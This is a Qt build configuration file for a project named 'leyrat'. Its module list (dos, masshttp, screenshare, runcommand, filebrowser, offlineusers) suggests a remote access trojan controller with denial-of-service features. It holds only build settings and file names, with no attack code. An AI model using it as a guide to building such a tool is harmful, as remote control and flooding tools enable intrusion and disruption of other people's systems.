#-------------------------------------------------
#
# Project created by QtCreator 2015-12-31T04:21:28
#
#-------------------------------------------------

QT       += core gui

greaterThan(QT_MAJOR_VERSION, 4): QT += widgets

INCLUDEPATH += "C:\Users\Leystryku\Desktop\Folders\Projects\C++\leyrat\sv_v2\include"
DEPENDPATH += "C:\Users\Leystryku\Desktop\Folders\Projects\C++\leyrat\sv_v2\lib"

TARGET = untitledl
TEMPLATE = app


SOURCES += main.cpp\
    dos.cpp \
    filebrowser.cpp \
    screenshare.cpp \
    runcommand.cpp\
    mainwindow.cpp \
	leynet.cpp \
	leyrat.cpp \
	main.cpp \
    masshttp.cpp \
    offlineusers.cpp \
    adduser.cpp \
    mylabel.cpp \
    funstuff.cpp \
    sruncommand.cpp \
    x264decoder.cpp


HEADERS  += mainwindow.h \
    dos.h \
    filebrowser.h \
    screenshare.h \
    runcommand.h \
	leybuf.h \
	leynet.h \
	leyrat.h \
    masshttp.h \
    offlineusers.h \
    adduser.h \
    mylabel.h \
    funstuff.h \
    sruncommand.h \
    x264decoder.h
	
FORMS    += mainwindow.ui \
    dos.ui \
    filebrowser.ui \
    screenshare.ui \
    runcommand.ui \
    masshttp.ui \
    offlineusers.ui \
    adduser.ui \
    funstuff.ui \
    sruncommand.ui

DISTFILES += \
    ../style.src

CONFIG += console
